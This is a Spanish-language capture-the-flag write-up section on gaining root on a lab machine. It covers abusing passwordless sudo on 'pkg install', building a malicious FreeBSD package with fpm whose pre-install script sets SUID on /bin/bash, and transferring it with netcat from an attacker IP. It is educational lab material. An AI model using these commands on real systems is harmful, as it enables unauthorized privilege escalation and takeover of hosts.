## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
uname -a
cat /etc/os-release
sudo -l
```

Aqui vemos que podemos lanzar el binario `/usr/sbin/pkg install *` como cualquier usuario sin proporcionar contraseña.
Buscando por [gtfobins](https://gtfobins.github.io/gtfobins/pkg/#sudo) vemos que podemos convertirnos en root con el comando

```bash
TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

sudo pkg install -y --no-repo-update ./x-1.0.txz
```

En este caso no funcciona porque la maquina victima no tiene **fpm** instalado. Vemos que este comando solo crea un `.txz`. Lo hacemos desde nuestra maquina
de atacante

```bash
gem install fpm
cd /tmp
mkdir privesc
cd privesc

TF="/tmp/privesc"
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

Aqui ya tenemos el `.txz` en nuestra maquina de atacante. Lo transferimos a la maquina victima

1. Desde la maquina de atacante

    ```bash
    nc -nlvp 443 < x-1.0.txz
    ```

1. Desde la maquina victima

    ```bash
    nc 10.10.16.3 443 > x-1.0.txz
    ```

Ya podemos lanzar la instalacion.

```bash
sudo pkg install -y --no-repo-update ./x-1.0.txz
bash -p
whoami
#Output
root
```

Ya estamos root y podemos leer la flag.
